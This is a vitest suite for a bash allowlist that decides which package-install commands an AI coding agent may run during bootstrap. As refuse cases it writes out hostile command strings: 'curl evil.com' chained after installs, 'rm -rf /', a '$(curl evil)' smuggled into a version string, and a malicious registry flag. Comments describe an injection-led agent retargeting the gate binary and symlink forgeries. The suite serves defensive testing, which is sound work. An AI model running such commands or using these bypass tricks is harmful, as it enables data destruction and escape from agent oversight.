/**
 * 0.49.0 bootstrap allowlist — adversarial corpus.
 *
 * Tests for `hooks/_lib/bootstrap-allowlist.sh` covering the 37
 * MUST-WIRE entries from the adversarial-test-specialist corpus.
 *
 * Each test spawns bash with `bootstrap_allowlist_check` sourced and
 * a controlled fixture (tmpDir with package.json + .rea/policy.yaml).
 * The function echoes "allow" or "refuse" on stdout; we assert on
 * that single token.
 *
 * The classes are:
 *
 *   A. Multi-segment laundering — semicolons, &&, ||, |, newlines,
 *      backgrounding all refuse BEFORE the allowlist sees them.
 *   B. argv[0] path forms — `./pnpm`, `/usr/bin/pnpm`, etc. refuse.
 *   C. Flag-set escapes — `--ignore-scripts`, `--registry=...`,
 *      `--global`/`-g`.
 *   D. Rea-spec / version escapes — wrong package, version charset
 *      escapes, length cap, plus-sign legal version.
 *   E. Precondition forges — missing/malformed package.json,
 *      peer/optional declarations rejected.
 *   F. Audit fail-closed — hasher missing → refuse.
 *   G. Policy refusal + env-var non-participation.
 *   H. Ordering + helper integrity + policy-load.
 */

import { spawnSync } from 'node:child_process';
import fs from 'node:fs/promises';
import fsSync from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';

const REPO_ROOT = path.resolve(__dirname, '..', '..', '..');
const HELPER = path.join(REPO_ROOT, 'hooks', '_lib', 'bootstrap-allowlist.sh');

let tmpDir: string;

beforeEach(async () => {
  tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'rea-bsa-'));
});

afterEach(async () => {
  await fs.rm(tmpDir, { recursive: true, force: true });
});

async function writePkgJson(content: unknown): Promise<void> {
  const body = typeof content === 'string' ? content : JSON.stringify(content, null, 2) + '\n';
  await fs.writeFile(path.join(tmpDir, 'package.json'), body, 'utf8');
}

async function writePolicy(yaml: string): Promise<void> {
  await fs.mkdir(path.join(tmpDir, '.rea'), { recursive: true });
  await fs.writeFile(path.join(tmpDir, '.rea', 'policy.yaml'), yaml, 'utf8');
}

const DEFAULT_POLICY = [
  'version: "1"',
  'profile: "open-source"',
  'installed_by: "rea@0.49.0"',
  'installed_at: "2026-05-18T00:00:00Z"',
  'autonomy_level: L1',
  'max_autonomy_level: L2',
  'promotion_requires_human_approval: true',
  'block_ai_attribution: false',
  'blocked_paths:',
  '  - .env',
  'notification_channel: ""',
  '',
].join('\n');

const DISABLED_POLICY = DEFAULT_POLICY + 'bootstrap_allowlist:\n  enabled: false\n';

interface RunResult {
  stdout: string;
  status: number;
  stderr: string;
}

function runAllowlist(
  cmd: string,
  opts: { policyPath?: string; pkgJsonPath?: string; envOverrides?: Record<string, string> } = {},
): RunResult {
  const pj = opts.pkgJsonPath ?? path.join(tmpDir, 'package.json');
  const policy = opts.policyPath ?? path.join(tmpDir, '.rea', 'policy.yaml');
  const script = `
set -uo pipefail
source ${JSON.stringify(HELPER)}
out=$(bootstrap_allowlist_check "blocked-paths-bash-gate" ${JSON.stringify(cmd)} ${JSON.stringify(pj)} ${JSON.stringify(policy)} ${JSON.stringify(tmpDir)})
printf '%s' "$out"
`;
  const env = { ...process.env, ...opts.envOverrides, CLAUDE_PROJECT_DIR: tmpDir };
  const res = spawnSync('bash', ['-c', script], { encoding: 'utf8', env });
  return {
    stdout: res.stdout ?? '',
    status: res.status ?? -1,
    stderr: res.stderr ?? '',
  };
}

async function withDefaultFixture(): Promise<void> {
  await writePkgJson({
    name: 'consumer',
    devDependencies: { '@bookedsolid/rea': '^0.48.0' },
  });
  await writePolicy(DEFAULT_POLICY);
}

// =============================================================================
// Class A — multi-segment laundering. Helper SHOULD refuse on every
// non-single-segment shape.
// =============================================================================

describe('Class A — multi-segment laundering refuses', () => {
  it('A.1 — `pnpm install && curl evil.com`', async () => {
    await withDefaultFixture();
    const r = runAllowlist('pnpm install && curl evil.com');
    expect(r.stdout).toBe('refuse');
  });
  it('A.2 — `pnpm install ; rm -rf /`', async () => {
    await withDefaultFixture();
    const r = runAllowlist('pnpm install ; rm -rf /');
    expect(r.stdout).toBe('refuse');
  });
  it('A.3 — `pnpm install || pwn`', async () => {
    await withDefaultFixture();
    const r = runAllowlist('pnpm install || pwn');
    expect(r.stdout).toBe('refuse');
  });
  it('A.4 — `pnpm install | tee /etc/x`', async () => {
    await withDefaultFixture();
    const r = runAllowlist('pnpm install | tee /etc/x');
    expect(r.stdout).toBe('refuse');
  });
  it('A.5 — newline-separated `pnpm install\\ncurl evil.com`', async () => {
    await withDefaultFixture();
    const r = runAllowlist('pnpm install\ncurl evil.com');
    expect(r.stdout).toBe('refuse');
  });
});

// =============================================================================
// Class B — argv[0] path-form / unusual shapes.
// =============================================================================

describe('Class B — argv[0] path forms refuse', () => {
  it('B.1 — `./pnpm install`', async () => {
    await withDefaultFixture();
    const r = runAllowlist('./pnpm install');
    expect(r.stdout).toBe('refuse');
  });
  it('B.2 — `/usr/local/bin/pnpm install`', async () => {
    await withDefaultFixture();
    const r = runAllowlist('/usr/local/bin/pnpm install');
    expect(r.stdout).toBe('refuse');
  });
  it('B.5 — `pnpm/x install` (slash in argv0)', async () => {
    await withDefaultFixture();
    const r = runAllowlist('pnpm/x install');
    expect(r.stdout).toBe('refuse');
  });
});

// =============================================================================
// Class C — flag-set escapes.
// =============================================================================

describe('Class C — flag-set escapes refuse', () => {
  it('C.2 — `pnpm install --ignore-scripts`', async () => {
    await withDefaultFixture();
    const r = runAllowlist('pnpm install --ignore-scripts');
    expect(r.stdout).toBe('refuse');
  });
  it('C.3 — `pnpm install --registry=https://evil/`', async () => {
    await withDefaultFixture();
    const r = runAllowlist('pnpm install --registry=https://evil/');
    expect(r.stdout).toBe('refuse');
  });
  it('C.4 — `npm install -g`', async () => {
    await withDefaultFixture();
    const r = runAllowlist('npm install -g');
    expect(r.stdout).toBe('refuse');
  });
});

// =============================================================================
// Class D — rea-spec / version escapes.
// =============================================================================

describe('Class D — rea-spec / version escapes refuse (or allow for legal shapes)', () => {
  it('D.1 — `pnpm add -D some-other-pkg`', async () => {
    await withDefaultFixture();
    const r = runAllowlist('pnpm add -D some-other-pkg');
    expect(r.stdout).toBe('refuse');
  });
  it('D.2 — `pnpm add -D @bookedsolid/rea@$(curl evil)`', async () => {
    await withDefaultFixture();
    const r = runAllowlist('pnpm add -D @bookedsolid/rea@$(curl evil)');
    expect(r.stdout).toBe('refuse');
  });
  it('D.3 — version with shell metacharacter `;`', async () => {
    await withDefaultFixture();
    const r = runAllowlist('pnpm add -D @bookedsolid/rea@1.0.0;rm');
    expect(r.stdout).toBe('refuse');
  });
  it('D.9 — 65-char version (over cap) refuses', async () => {
    await withDefaultFixture();
    const longVer = 'a'.repeat(65);
    const r = runAllowlist(`pnpm add -D @bookedsolid/rea@${longVer}`);
    expect(r.stdout).toBe('refuse');
  });
  it('D.10 — empty version refuses', async () => {
    await withDefaultFixture();
    const r = runAllowlist('pnpm add -D @bookedsolid/rea@');
    expect(r.stdout).toBe('refuse');
  });
  it('D.11 — 64-char version (at cap) REFUSES (R6-P2: version-pinned forms refuse)', async () => {
    // R6-P2 (codex round 6): the bootstrap allowlist no longer
    // accepts ANY `@bookedsolid/rea@<ver>` form. Version selection
    // is `rea init` (caret pin at install) and `rea upgrade`
    // (managed-caret bump) territory — not the Bash-tier bootstrap
    // path. Pre-R6, a 64-char version (right at the cap) was
    // permitted; this test flips to REFUSE.
    await withDefaultFixture();
    const ver = 'a'.repeat(64);
    const r = runAllowlist(`pnpm add -D @bookedsolid/rea@${ver}`);
    expect(r.stdout).toBe('refuse');
  });
  it('D.12 — version with backslash refuses', async () => {
    await withDefaultFixture();
    const r = runAllowlist('pnpm add -D @bookedsolid/rea@1.0.0\\nrm');
    expect(r.stdout).toBe('refuse');
  });
  it('D.13 — version with `=` refuses', async () => {
    await withDefaultFixture();
    const r = runAllowlist('pnpm add -D @bookedsolid/rea@1=0');
    expect(r.stdout).toBe('refuse');
  });
  it('D.14 — version with `+` REFUSES (R6-P2: legal semver build metadata still refuses)', async () => {
    // R6-P2 (codex round 6): even valid semver-shaped versions are
    // refused now. Pre-R6 this was an allow case to cover the npm
    // semver build-metadata syntax; the bootstrap path no longer
    // selects versions.
    await withDefaultFixture();
    const r = runAllowlist('pnpm add -D @bookedsolid/rea@1.0.0+build');
    expect(r.stdout).toBe('refuse');
  });
  it('D.15 — `@latest` dist-tag REFUSES (R6-P2)', async () => {
    // Dist-tag form was permitted pre-R6 because the charset
    // accepted `latest`. Critical to lock down: an injection-
    // induced agent could call `pnpm add -D @bookedsolid/rea@latest`
    // and force a major-version retargeting of the trusted gate
    // binary.
    await withDefaultFixture();
    const r = runAllowlist('pnpm add -D @bookedsolid/rea@latest');
    expect(r.stdout).toBe('refuse');
  });
  it('D.16 — exact version `@0.49.0` REFUSES (R6-P2)', async () => {
    // Exact-version downgrade/upgrade — the exact retarget attack
    // codex called out. `rea upgrade` is the audited path for
    // version selection; Bash-tier bootstrap must not allow it.
    await withDefaultFixture();
    const r = runAllowlist('pnpm add -D @bookedsolid/rea@0.49.0');
    expect(r.stdout).toBe('refuse');
  });
  it('D.17 — npm install with version REFUSES (R6-P2)', async () => {
    await withDefaultFixture();
    const r = runAllowlist('npm install -D @bookedsolid/rea@latest');
    expect(r.stdout).toBe('refuse');
  });
  it('D.18 — yarn add with version REFUSES (R6-P2)', async () => {
    await withDefaultFixture();
    const r = runAllowlist('yarn add -D @bookedsolid/rea@1.0.0');
    expect(r.stdout).toBe('refuse');
  });
});

// =============================================================================
// Class E — precondition forges.
// =============================================================================

describe('Class E — precondition forges refuse', () => {
  it('E.1 — no package.json at all', async () => {
    // Do not call withDefaultFixture; just write the policy.
    await writePolicy(DEFAULT_POLICY);
    const r = runAllowlist('pnpm install');
    expect(r.stdout).toBe('refuse');
  });
  it('E.3 — peerDependencies-only declaration refuses', async () => {
    await writePkgJson({
      name: 'consumer',
      peerDependencies: { '@bookedsolid/rea': '^0.49.0' },
    });
    await writePolicy(DEFAULT_POLICY);
    const r = runAllowlist('pnpm install');
    expect(r.stdout).toBe('refuse');
  });
  it('E.4 — optionalDependencies-only declaration refuses', async () => {
    await writePkgJson({
      name: 'consumer',
      optionalDependencies: { '@bookedsolid/rea': '^0.49.0' },
    });
    await writePolicy(DEFAULT_POLICY);
    const r = runAllowlist('pnpm install');
    expect(r.stdout).toBe('refuse');
  });
  it('E.6 — malformed package.json refuses', async () => {
    await writePkgJson('NOT JSON {{{');
    await writePolicy(DEFAULT_POLICY);
    const r = runAllowlist('pnpm install');
    expect(r.stdout).toBe('refuse');
  });
  it('E.8 — dependencies.@bookedsolid/rea: false declaration refuses (P2-2)', async () => {
    // P2-2 (codex round 1): jq's `//` operator treats both `null` AND
    // `false` as default triggers, so the pre-fix expression
    //   ((.dependencies // {}) | pick) // ((.devDependencies // {}) | pick)
    // would fall THROUGH a hostile `{"dependencies":{"@bookedsolid/rea":false}}`
    // to the devDeps lookup and could allow when devDeps had a string.
    // The tightened expression
    //   (.dependencies[k] // .devDependencies[k]) | select(type=="string")
    // makes the jq tier behave the same as the node tier
    // (typeof x === "string"): false / null / number / array / object
    // all refuse, only string values qualify. Test with deps:false AND
    // no devDeps fallthrough — must refuse.
    await writePkgJson({
      name: 'consumer',
      dependencies: { '@bookedsolid/rea': false },
    });
    await writePolicy(DEFAULT_POLICY);
    const r = runAllowlist('pnpm install');
    expect(r.stdout).toBe('refuse');
  });
  it('E.9 — BOM-prefixed package.json ALLOWS (P2-1)', async () => {
    // P2-1 (codex round 1): in environments without jq, the allowlist
    // falls back to a node parser; pre-fix, JSON.parse threw on a BOM
    // and treated a legitimate @bookedsolid/rea declaration as
    // missing — refusing `pnpm install` recovery on Windows-authored
    // manifests even though selfPinRea wrote them fine. We now strip
    // a leading BOM in the node tier before JSON.parse. The jq tier
    // already tolerates BOM transparently, so the test exercises
    // tier-independence: an operator who has jq and an operator who
    // does not both see the same allow.
    const body = '﻿' + JSON.stringify({
      name: 'consumer',
      devDependencies: { '@bookedsolid/rea': '^0.49.0' },
    }) + '\n';
    await writePkgJson(body);
    await writePolicy(DEFAULT_POLICY);
    const r = runAllowlist('pnpm install');
    expect(r.stdout).toBe('allow');
  });
  it('E.9b — BOM-prefixed package.json ALLOWS even when jq is absent (P2-1 — forces node tier)', async () => {
    // Force the helper to use the Tier-2 node fallback. The simplest
    // portable way to mask jq without breaking the other tools in the
    // same directory (shasum, find, grep, etc. all live in /usr/bin/
    // alongside jq on macOS) is to prepend a shim directory containing
    // a `jq` script that exits non-zero. `command -v jq` succeeds, so
    // the helper invokes it, but the call fails, falling through to
    // node tier. Pre-fix that would have refused on BOM-prefixed
    // input; post-fix it allows.
    const body = '﻿' + JSON.stringify({
      name: 'consumer',
      devDependencies: { '@bookedsolid/rea': '^0.49.0' },
    }) + '\n';
    await writePkgJson(body);
    await writePolicy(DEFAULT_POLICY);
    // Build a shim dir with a sabotaged jq that always fails. Prepend
    // it to PATH so it shadows the real jq.
    const shimDir = path.join(tmpDir, '__bin__');
    fsSync.mkdirSync(shimDir, { recursive: true });
    const sabotagedJq = path.join(shimDir, 'jq');
    fsSync.writeFileSync(sabotagedJq, '#!/bin/sh\nexit 1\n', { mode: 0o755 });
    const origPath = process.env.PATH ?? '';
    const r = runAllowlist('pnpm install', {
      envOverrides: { PATH: `${shimDir}${path.delimiter}${origPath}` },
    });
    expect(r.stdout).toBe('allow');
  });
  it('E.7 — workspace shorthand `workspace:^` declaration ALLOWS', async () => {
    // workspace specs are a legitimate declaration form.
    await writePkgJson({
      name: 'consumer',
      devDependencies: { '@bookedsolid/rea': 'workspace:^' },
    });
    await writePolicy(DEFAULT_POLICY);
    const r = runAllowlist('pnpm install');
    expect(r.stdout).toBe('allow');
  });

  // ───────────────────────────────────────────────────────────────────
  // R20-P2 — package.json symlink refusal.
  // ───────────────────────────────────────────────────────────────────
  // Pre-R20 `_bootstrap_check_package_json` used `[ -f ]`, which
  // follows symlinks. An attacker could symlink `package.json` to
  // an out-of-tree file that declared `@bookedsolid/rea`, and the
  // allowlist would trust the target → next `pnpm add` /
  // `npm install` would mutate the out-of-tree file silently.
  // R20-P2 adds an `[ -L ]` guard so any symlink at the precondition
  // path refuses with an operator-facing stderr explainer.

  it('E.S.1 — package.json symlinked to OUT-OF-TREE target declaring rea → REFUSE + stderr', async () => {
    // Build the forged target outside the project tree (a separate
    // tmpdir simulating /tmp/elsewhere). It declares `@bookedsolid/rea`
    // — the kind of file that would pass the bare precondition if the
    // allowlist followed the symlink.
    const externalDir = await fs.mkdtemp(path.join(os.tmpdir(), 'rea-r20-ext-'));
    try {
      const externalPj = path.join(externalDir, 'package.json');
      await fs.writeFile(
        externalPj,
        JSON.stringify({
          name: 'forged',
          devDependencies: { '@bookedsolid/rea': '^0.49.0' },
        }) + '\n',
        'utf8',
      );
      // Place the symlink at the project's package.json path. The
      // allowlist's pj_path is `<tmpDir>/package.json`; the link
      // points to the out-of-tree target.
      const linkPath = path.join(tmpDir, 'package.json');
      await fs.symlink(externalPj, linkPath);
      await writePolicy(DEFAULT_POLICY);

      const r = runAllowlist('pnpm install');
      expect(r.stdout).toBe('refuse');
      // Operator-facing stderr explainer must surface so the user
      // knows WHY the allowlist refused (otherwise they'd assume
      // the precondition was simply absent).
      expect(r.stderr).toMatch(/is a symlink/);
    } finally {
      await fs.rm(externalDir, { recursive: true, force: true });
    }
  });

  it('E.S.2 — regular package.json declaring rea STILL ALLOWS (regression guard)', async () => {
    // Defense: the symlink check must not over-block legitimate
    // regular-file precondition. Same payload as the E.9 happy-path
    // tests, just sanity-restated with the explicit "no symlink"
    // shape.
    await writePkgJson({
      name: 'consumer',
      devDependencies: { '@bookedsolid/rea': '^0.49.0' },
    });
    await writePolicy(DEFAULT_POLICY);
    const r = runAllowlist('pnpm install');
    expect(r.stdout).toBe('allow');
  });

  it('E.S.3 — package.json symlinked to DANGLING target → REFUSE (no follow)', async () => {
    // The symlink itself triggers refusal; the target never gets
    // resolved. Even a dangling link refuses — no fall-through to
    // the "file missing" arm that might be exploited differently
    // (defense in depth: refuse-via-banner with explainer rather
    // than silent-refuse via the precondition-missing path).
    const linkPath = path.join(tmpDir, 'package.json');
    await fs.symlink('/nonexistent/forged-target.json', linkPath);
    await writePolicy(DEFAULT_POLICY);

    const r = runAllowlist('pnpm install');
    expect(r.stdout).toBe('refuse');
    expect(r.stderr).toMatch(/is a symlink/);
  });

  it('E.S.4 — package.json symlinked to IN-TREE target declaring rea → still REFUSE', async () => {
    // Even when the symlink target is INSIDE the project tree, refuse.
    // The check is shape-based (`[ -L ]` matches any symlink), not
    // target-based. This is the conservative posture R10-P2 also
    // uses in `selfPinRea` — symlink-shape is enough to refuse.
    const realPj = path.join(tmpDir, 'real-package.json');
    await fs.writeFile(
      realPj,
      JSON.stringify({
        name: 'consumer',
        devDependencies: { '@bookedsolid/rea': '^0.49.0' },
      }) + '\n',
      'utf8',
    );
    const linkPath = path.join(tmpDir, 'package.json');
    await fs.symlink(realPj, linkPath);
    await writePolicy(DEFAULT_POLICY);

    const r = runAllowlist('pnpm install');
    expect(r.stdout).toBe('refuse');
    expect(r.stderr).toMatch(/is a symlink/);
  });
});

// =============================================================================
// Class F — audit fail-closed. When hashing / audit emission fails,
// the allowlist refuses rather than allowing silently.
// =============================================================================

describe('Class F — audit fail-closed', () => {
  it('F.1 — read-only .rea/ → audit write fails → refuse-hard', async () => {
    // R7-P1 (codex round 7): audit-integrity failures emit the
    // `refuse-hard` stdout token so the shim caller refuses via
    // banner regardless of substring scan. Read-only `.rea/`
    // prevents audit-emit; this is exactly the case the new token
    // discriminates.
    await withDefaultFixture();
    const reaDir = path.join(tmpDir, '.rea');
    await fs.chmod(reaDir, 0o555);
    try {
      const r = runAllowlist('pnpm install');
      if (process.getuid?.() !== 0) {
        expect(r.stdout).toBe('refuse-hard');
      }
    } finally {
      await fs.chmod(reaDir, 0o755);
    }
  });
  it('F.2 — every allow emits an audit event', async () => {
    await withDefaultFixture();
    const r = runAllowlist('pnpm install');
    expect(r.stdout).toBe('allow');
    const audit = await fs.readFile(path.join(tmpDir, '.rea', 'audit.jsonl'), 'utf8');
    expect(audit).toMatch(/rea\.bash\.bootstrap_allow/);
    // P1-1 (codex round 1): emission_source is the canonical AuditRecord
    // value "rea-cli" — the bash helper is rea acting as its own CLI in
    // degraded mode. The pre-fix value "hook" was not one of the union
    // members (rea-cli | codex-cli | other) so every TS-side reader
    // rejected or silently coerced.
    expect(audit).toMatch(/"emission_source":"rea-cli"/);
    // P1-2 (codex round 1): allowed shapes (pnpm install / pnpm add /
    // npm ci / yarn / corepack) are WRITE-class side effects
    // (node_modules + lockfile + package.json mutation). Stamping them
    // as Tier.Read would make future audit grep for write-class bypass
    // attempts miss every bootstrap allow.
    expect(audit).toMatch(/"tier":"write"/);
    expect(audit).toMatch(/"cli_resolution":"missing"/);
  });
  it('F.4 — audit chain preserves prev_hash across two allows', async () => {
    await withDefaultFixture();
    runAllowlist('pnpm install');
    runAllowlist('npm ci');
    const raw = await fs.readFile(path.join(tmpDir, '.rea', 'audit.jsonl'), 'utf8');
    const lines = raw
      .split('\n')
      .filter((l) => l.length > 0)
      .map((l) => JSON.parse(l) as { hash: string; prev_hash: string });
    expect(lines.length).toBeGreaterThanOrEqual(2);
    // 2nd line's prev_hash == 1st line's hash.
    const first = lines[0];
    const second = lines[1];
    expect(first).toBeDefined();
    expect(second).toBeDefined();
    expect(second!.prev_hash).toBe(first!.hash);
  });

  // R4-P1 (codex round 4): a corrupted audit tail (partial line,
  // malformed JSON, missing/short hash, all-whitespace) MUST NOT
  // silently fall back to genesis. The next bootstrap allow would
  // record a record whose `prev_hash` skipped the corrupted entries
  // — permanently forking the chain. The helper refuses on any
  // tail-corruption signal so the operator repairs the chain
  // before retrying. Genesis (file absent / zero bytes) remains
  // the only legitimate non-tail-derived starting point.
  //
  // R7-P1 (codex round 7): these tail-corruption cases emit the
  // `refuse-hard` stdout token (not plain `refuse`) so the shim
  // caller refuses via banner regardless of substring scan. Pre-
  // R7, the helper emitted `refuse` here and the R5-restructured
  // shim collapsed that with "shape didn't match" — a no-substring-
  // match payload would have fallen through to silent-allow,
  // violating the auditability invariant.

  it('F.5 — partial last line (truncated JSON, no trailing newline) → REFUSE-HARD', async () => {
    await withDefaultFixture();
    runAllowlist('pnpm install');
    const auditFile = path.join(tmpDir, '.rea', 'audit.jsonl');
    const before = await fs.readFile(auditFile, 'utf8');
    expect(before.endsWith('\n')).toBe(true);
    await fs.appendFile(auditFile, '{"timestamp":"2026', 'utf8');
    const r = runAllowlist('npm ci');
    expect(r.stdout).toBe('refuse-hard');
    expect(r.stderr).toMatch(/partial write detected|trailing newline/);
  });

  it('F.6 — last line is unparseable JSON (newline-terminated) → REFUSE-HARD', async () => {
    await withDefaultFixture();
    runAllowlist('pnpm install');
    const auditFile = path.join(tmpDir, '.rea', 'audit.jsonl');
    await fs.appendFile(auditFile, '{"oops": broken JSON}\n', 'utf8');
    const r = runAllowlist('npm ci');
    expect(r.stdout).toBe('refuse-hard');
    expect(r.stderr).toMatch(/not valid JSON/);
  });

  it('F.7 — last line is JSON but missing `hash` field → REFUSE-HARD', async () => {
    await withDefaultFixture();
    runAllowlist('pnpm install');
    const auditFile = path.join(tmpDir, '.rea', 'audit.jsonl');
    await fs.appendFile(auditFile, '{"timestamp":"2026-05-19T00:00:00Z","prev_hash":"00"}\n', 'utf8');
    const r = runAllowlist('npm ci');
    expect(r.stdout).toBe('refuse-hard');
    expect(r.stderr).toMatch(/missing a valid 64-hex `hash` field/);
  });

  it('F.8 — last line has wrong-length / non-hex `hash` field → REFUSE-HARD', async () => {
    await withDefaultFixture();
    runAllowlist('pnpm install');
    const auditFile = path.join(tmpDir, '.rea', 'audit.jsonl');
    await fs.appendFile(
      auditFile,
      '{"timestamp":"2026-05-19T00:00:00Z","hash":"deadbeef000000000000000000000000000000000000000000000000000000"}\n',
      'utf8',
    );
    const r = runAllowlist('npm ci');
    expect(r.stdout).toBe('refuse-hard');
    expect(r.stderr).toMatch(/missing a valid 64-hex `hash` field/);
  });

  it('F.9 — last line has non-hex char in `hash` field → REFUSE-HARD', async () => {
    await withDefaultFixture();
    runAllowlist('pnpm install');
    const auditFile = path.join(tmpDir, '.rea', 'audit.jsonl');
    await fs.appendFile(
      auditFile,
      '{"timestamp":"2026-05-19T00:00:00Z","hash":"Zeadbeef000000000000000000000000000000000000000000000000000000ab"}\n',
      'utf8',
    );
    const r = runAllowlist('npm ci');
    expect(r.stdout).toBe('refuse-hard');
    expect(r.stderr).toMatch(/missing a valid 64-hex `hash` field/);
  });

  it('F.10 — last line is a JSON array (not an object) → REFUSE-HARD', async () => {
    await withDefaultFixture();
    runAllowlist('pnpm install');
    const auditFile = path.join(tmpDir, '.rea', 'audit.jsonl');
    await fs.appendFile(auditFile, '["not","an","object"]\n', 'utf8');
    const r = runAllowlist('npm ci');
    expect(r.stdout).toBe('refuse-hard');
    expect(r.stderr).toMatch(/not a JSON object/);
  });

  it('F.11 — file contains only whitespace/newlines → REFUSE-HARD', async () => {
    await withDefaultFixture();
    const auditFile = path.join(tmpDir, '.rea', 'audit.jsonl');
    await fs.writeFile(auditFile, '\n\n\n', 'utf8');
    const r = runAllowlist('pnpm install');
    expect(r.stdout).toBe('refuse-hard');
    expect(r.stderr).toMatch(/contains only whitespace/);
  });

  it('F.12 — empty audit file (zero bytes) → GENESIS, proceeds normally', async () => {
    await withDefaultFixture();
    const auditFile = path.join(tmpDir, '.rea', 'audit.jsonl');
    // Pre-create as zero-byte file. The helper should treat as
    // genesis and proceed.
    await fs.writeFile(auditFile, '', 'utf8');
    const r = runAllowlist('pnpm install');
    expect(r.stdout).toBe('allow');
    // First record's prev_hash must be the genesis sentinel.
    const lines = (await fs.readFile(auditFile, 'utf8'))
      .split('\n')
      .filter((l) => l.length > 0)
      .map((l) => JSON.parse(l) as { prev_hash: string });
    expect(lines.length).toBe(1);
    expect(lines[0]!.prev_hash).toBe(
      '0000000000000000000000000000000000000000000000000000000000000000',
    );
  });

  it('F.13 — missing audit file → GENESIS, proceeds normally', async () => {
    await withDefaultFixture();
    // No audit file at all — helper creates and seeds with genesis.
    const r = runAllowlist('pnpm install');
    expect(r.stdout).toBe('allow');
  });

  it('F.14 — recovery scenario: repair the chain, the next allow proceeds', async () => {
    // Operator hits a corruption (refuse-hard, R7-P1), then deletes
    // the audit file (or truncates to a known-good tail). Subsequent
    // allows succeed via the genesis path.
    await withDefaultFixture();
    runAllowlist('pnpm install');
    const auditFile = path.join(tmpDir, '.rea', 'audit.jsonl');
    await fs.appendFile(auditFile, '{"broken":\n', 'utf8'); // corrupt
    expect(runAllowlist('npm ci').stdout).toBe('refuse-hard');
    // Operator repairs by truncating to the known-good tail.
    await fs.rm(auditFile);
    expect(runAllowlist('npm ci').stdout).toBe('allow');
  });
});

// =============================================================================
// Class G — policy refusal + env-var non-participation.
// =============================================================================

describe('Class G — policy refusal + env-var non-participation', () => {
  it('G.1 — `bootstrap_allowlist.enabled: false` refuses every shape', async () => {
    await writePkgJson({
      name: 'consumer',
      devDependencies: { '@bookedsolid/rea': '^0.49.0' },
    });
    await writePolicy(DISABLED_POLICY);
    const r = runAllowlist('pnpm install');
    expect(r.stdout).toBe('refuse');
  });
  it('G.2 — env-var REA_BOOTSTRAP_ALLOW=1 does NOT participate', async () => {
    await withDefaultFixture();
    await writePolicy(DISABLED_POLICY);
    const r = runAllowlist('pnpm install', {
      envOverrides: { REA_BOOTSTRAP_ALLOW: '1', REA_FORCE_BOOTSTRAP: 'yes' },
    });
    expect(r.stdout).toBe('refuse');
  });

  // R7-P2 (codex round 7): the YAML opt-out parser must accept the
  // same boolean forms the TS reader's yaml.parse() accepts as
  // booleans. yaml v2 recognises:
  //   lower-case   true/false
  //   capitalized  True/False
  //   uppercase    TRUE/FALSE
  // and treats `no`, `off`, quoted forms, etc. as STRINGS (which
  // then fail zod's strict z.boolean() at TS-load time). The bash
  // fallback must mirror that exactly.

  it('G.3 — `enabled: False` (capitalized) honors the opt-out', async () => {
    await writePkgJson({
      name: 'consumer',
      devDependencies: { '@bookedsolid/rea': '^0.49.0' },
    });
    await writePolicy(DEFAULT_POLICY + 'bootstrap_allowlist:\n  enabled: False\n');
    const r = runAllowlist('pnpm install');
    expect(r.stdout).toBe('refuse');
  });

  it('G.4 — `enabled: FALSE` (uppercase) honors the opt-out', async () => {
    await writePkgJson({
      name: 'consumer',
      devDependencies: { '@bookedsolid/rea': '^0.49.0' },
    });
    await writePolicy(DEFAULT_POLICY + 'bootstrap_allowlist:\n  enabled: FALSE\n');
    const r = runAllowlist('pnpm install');
    expect(r.stdout).toBe('refuse');
  });

  it('G.5 — flow form `bootstrap_allowlist: { enabled: False }` honors opt-out', async () => {
    await writePkgJson({
      name: 'consumer',
      devDependencies: { '@bookedsolid/rea': '^0.49.0' },
    });
    await writePolicy(DEFAULT_POLICY + 'bootstrap_allowlist: { enabled: False }\n');
    const r = runAllowlist('pnpm install');
    expect(r.stdout).toBe('refuse');
  });

  it('G.6 — `enabled: True` (capitalized true) keeps the allowlist enabled', async () => {
    // Symmetric coverage on the true side — verify True parses as
    // boolean true rather than being ignored.
    await writePkgJson({
      name: 'consumer',
      devDependencies: { '@bookedsolid/rea': '^0.49.0' },
    });
    await writePolicy(DEFAULT_POLICY + 'bootstrap_allowlist:\n  enabled: True\n');
    const r = runAllowlist('pnpm install');
    expect(r.stdout).toBe('allow');
  });

  it('G.7 — `enabled: no` parses as STRING (not bool) → schema default (enabled) applies', async () => {
    // yaml v2 returns the string "no" for the unquoted token `no`.
    // The TS reader would reject it via z.boolean(); the bash
    // fallback keeps the schema default (enabled) rather than
    // silently misreading it as "off". The test pinning this
    // behavior prevents a drift class where someone "improves" the
    // parser to accept YAML 1.1 booleans and silently disables the
    // allowlist on a string-typed opt-out.
    await writePkgJson({
      name: 'consumer',
      devDependencies: { '@bookedsolid/rea': '^0.49.0' },
    });
    await writePolicy(DEFAULT_POLICY + 'bootstrap_allowlist:\n  enabled: no\n');
    const r = runAllowlist('pnpm install');
    expect(r.stdout).toBe('allow');
  });

  it('G.8 — `enabled: "false"` (quoted string) → schema default (enabled) applies', async () => {
    // Quoted "false" is a string, not a bool — TS reader rejects;
    // bash keeps the default.
    await writePkgJson({
      name: 'consumer',
      devDependencies: { '@bookedsolid/rea': '^0.49.0' },
    });
    await writePolicy(DEFAULT_POLICY + 'bootstrap_allowlist:\n  enabled: "false"\n');
    const r = runAllowlist('pnpm install');
    expect(r.stdout).toBe('allow');
  });
});

// =============================================================================
// Class H — ordering + helper integrity + policy-load.
// =============================================================================

describe('Class H — ordering + helper integrity + policy-load', () => {
  it('H.1 — quoted argv `pnpm "install"` refuses (defense feature)', async () => {
    await withDefaultFixture();
    const r = runAllowlist('pnpm "install"');
    expect(r.stdout).toBe('refuse');
  });
  it('H.3 — IFS leakage does NOT widen the parser', async () => {
    await withDefaultFixture();
    const r = runAllowlist('pnpm install', {
      envOverrides: { IFS: '\n' },
    });
    // With IFS leak, an unquoted `read -ra` could split differently —
    // we declare a local IFS to defeat this. Result must still be allow.
    expect(r.stdout).toBe('allow');
  });
  it('H.6 — policy file missing → schema default (enabled) → allow', async () => {
    await writePkgJson({
      name: 'consumer',
      devDependencies: { '@bookedsolid/rea': '^0.49.0' },
    });
    // No policy file at all.
    const r = runAllowlist('pnpm install', {
      policyPath: path.join(tmpDir, '.rea', 'does-not-exist.yaml'),
    });
    expect(r.stdout).toBe('allow');
  });
});

// =============================================================================
// MUST-ALLOW happy paths (one per PM)
// =============================================================================

describe('happy paths per PM', () => {
  it('pnpm install -> allow', async () => {
    await withDefaultFixture();
    const r = runAllowlist('pnpm install');
    expect(r.stdout).toBe('allow');
  });
